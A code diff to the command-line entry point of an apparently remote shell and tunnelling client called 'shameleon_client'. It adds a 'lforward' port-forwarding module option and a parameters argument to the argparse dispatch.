@@ -2,6 +2,7 @@
 import argparse
 import os
 
+from shameleon_client.modules.lforward import ShameleonLforward
 from shameleon_client.modules.shell import ShameleonShell
 from shameleon_client.profile import Profile
 from shameleon_client.providers.base import ShameleonProvider
@@ -24,8 +25,13 @@ def main():
     parser.add_argument(
         'module',
         type=str,
-        choices=['shell', 'socks'],
+        choices=['shell', 'lforward', 'socks'],
         help='Names of module to run',
+    )
+    parser.add_argument(
+        'parameters',
+        type=str,
+        help='Parameters for the module',
     )
     args = parser.parse_args()
 
@@ -52,6 +58,9 @@ def main():
     if args.module == 'shell':
         shell = ShameleonShell(provider)
         shell.run()
+    elif args.module == 'lforward':
+        lforward = ShameleonLforward(provider, args.parameters)
+        lforward.run()
     elif args.module == 'socks':
         raise NotImplementedError('SOCKS module not implemented yet ;)')
 
